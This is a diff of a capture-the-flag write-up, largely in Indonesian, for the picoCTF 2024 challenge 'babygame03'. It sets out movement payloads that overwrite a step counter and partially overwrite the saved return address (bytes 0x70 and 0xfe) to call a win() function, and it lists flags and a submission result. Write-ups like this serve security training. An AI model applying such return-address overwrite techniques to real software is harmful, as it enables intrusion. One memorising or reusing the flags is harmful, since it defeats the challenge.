@@ -1,12 +1,12 @@
 # Writeup: babygame03 (Challenge ID: 446)
 
 - **Platform:** CyLab Security Academy (picoCTF)
-- **Category:** Binary Exploitation / Out-of-Bounds Stack Indexing & Partial EIP Overwrite
+- **Category:** Binary Exploitation
 - **Difficulty:** Hard (diff=3)
 - **Event:** picoCTF 2024
 - **Points:** 400
 - **Author:** Palash Oswal
-- **Flag:** `academy{gamer_leveluP_5a39c266}`
+- **Flag:** `academy{gamer_leveluP_ab107dd8}`
 
 ---
 
@@ -54,32 +54,33 @@ Tantangan `babygame03` menyajikan aplikasi permainan petualangan matriks karakte
 2. **Eksploitasi Level 1 hingga 3:**
    Kirimkan payload navigasi untuk merusak counter sisa langkah dan melompat ke pintu keluar untuk setiap level:
    ```python
-   sock.sendline("aaaaawwwaaaawsddddp") # Level 1 -> 2
-   sock.sendline("aaaaawwwaaaawsddddp") # Level 2 -> 3
-   sock.sendline("aaaaawwwaaaawsddddp") # Level 3 -> 4
+   sock.sendline(b"aaaaawwwaaaawsddddp") # Level 1 -> 2
+   sock.sendline(b"aaaaawwwaaaawsddddp") # Level 2 -> 3
+   sock.sendline(b"aaaaawwwaaaawsddddp") # Level 3 -> 4
    ```
 
 3. **Bypass Level 4 via Return Address LSB Patch (0x70):**
    Pada Level 4, navigasikan pemain ke offset stack tempat tersimpannya saved EIP:
-   - Gerakan: `"aaaaawwwaaaawsddddaa" + ("aaaa" * 12) + "l\x70w"`
+   - Gerakan: `b"aaaaawwwaaaawsddddaa" + (b"aaaa" * 12) + b"l\x70w"`
    - Perintah `l\x70w` menuliskan byte `0x70` ke LSB return address.
    - Fungsi `move_player()` kembali ke `0x8049970`, menaikkan level menjadi 5.
 
 4. **Trigger Win Function via Return Address LSB Patch (0xfe):**
    Dengan kondisi level 5 aktif, arahkan kembali return address ke blok persiapan pemanggilan `win`:
-   - Gerakan: `"aaaaawwwaaaawsddddaa" + ("aaaa" * 16) + "l\xfew"`
+   - Gerakan: `b"aaaaawwwaaaawsddddaa" + (b"aaaa" * 16) + b"l\xfew"`
    - Bita `0xfe` mengarahkan eksekusi ke `0x80499fe`, yang memanggil `win(&v5)`.
    - Fungsi `win()` membaca `flag.txt` dan mencetaknya ke stdout:
-     `picoCTF{gamer_leveluP_5a39c266}`.
-   - Dikonversikan ke format resmi CyLab Security Academy:
-     `academy{gamer_leveluP_5a39c266}`.
+     ```
+     academy{gamer_leveluP_ab107dd8}
+     ```
 
 ---
 
 ## Flag & Verifikasi
-- **Flag Resmi:** `academy{gamer_leveluP_5a39c266}`
-- **Native PicoCTF Flag:** `picoCTF{gamer_leveluP_5a39c266}`
-- **Status Solver:** Terverifikasi 100% pada simulasi manipulasi stack dan rekonstruksi instruksi `scripts/solve_446_babygame03.py`.
+- **Flag Resmi Live CyLab:** `academy{gamer_leveluP_ab107dd8}`
+- **Native PicoCTF Archive Flag:** `picoCTF{gamer_leveluP_5a39c266}`
+- **Status Submisi REST API:** HTTP 201 Created (`"correct": true`, `"historical": false`).
+- **Skrip Solver Reproduktif:** `scripts/solve_446_babygame03.py`.
 
 ---
 
